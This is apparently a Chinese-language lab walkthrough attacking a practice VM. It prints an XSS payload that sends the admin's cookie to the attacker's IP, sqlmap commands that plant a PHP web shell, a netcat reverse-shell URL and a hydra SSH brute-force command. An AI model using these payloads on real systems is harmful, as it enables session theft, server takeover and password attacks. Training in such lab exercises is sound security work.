0x2

Kali：192.168.179.129

靶场：192.168.179.133

先来nmap探测一下开放了那些端口 有什么服务

可以看到开放了80 22端口

先来访问这个ip看看

大概浏览一下页面 看到了后台地址 还有几处留言框

先来试试弱口令 

结果想都不用想肯定是进不去的 

然后来到留言板这边看看 

判断可能会存在xss

先在kali起个服务 监听一下

然后构造payload：

<script>new Image().src='http://192.168.179.129/cookie.php?c='+document.cookie;</script>


在留言板处插入payload

然后看看kali

成功打到后台管理员的cookie

这里要注意的是不能用document.location的payload 不然会疯狂刷新)

然后用管理员cookie登录后台


大概浏览了一下后台没有什么功能点 不过有几处很明显的sql注入

加了个单引号直接报错 还报出了网站的路径

直接sqlmap一把梭哈

ok，存在注入

接下来根据报错报出来的路径 尝试写入一个shell

<?php system($_GET['cmd']) ?>

sqlmap跑一下

 sqlmap -r abc.txt --file-write="./shell.txt" --file-dest="/var/www/classes/shell.php"

没写进去，应该是这个路径下没权限 

那就扫一下目录 看看还有没有别的路径

尝试n次 终于在css路径下写入进去了

sqlmap -r abc.txt --file-write="./shell.txt" --file-dest="/var/www/css/shell.php"

成功写入进去

来访问看看

在kali起个nc 反连过去

http://192.168.179.133/css/shell.php?cmd=/bin/nc%20192.168.179.129%208888%20-e%20/bin/bash


ok 

接下来尝试提权

先执行SHELL=/bin/bash script -q /dev/null  将 shell 转变成交互式的 shell 看起来舒服一点

经过查看，发现了一个user用户

然后切换到user目录下  发现应该是个root权限

然后用最简单粗暴的办法 爆破试试

hydra -l user -P /usr/share/wordlists/dirb/common.txt -f -v 192.168.179.133 ssh

由于时间问题我就不爆破了，应该是可以爆破出来的，最后能拿到root权限。
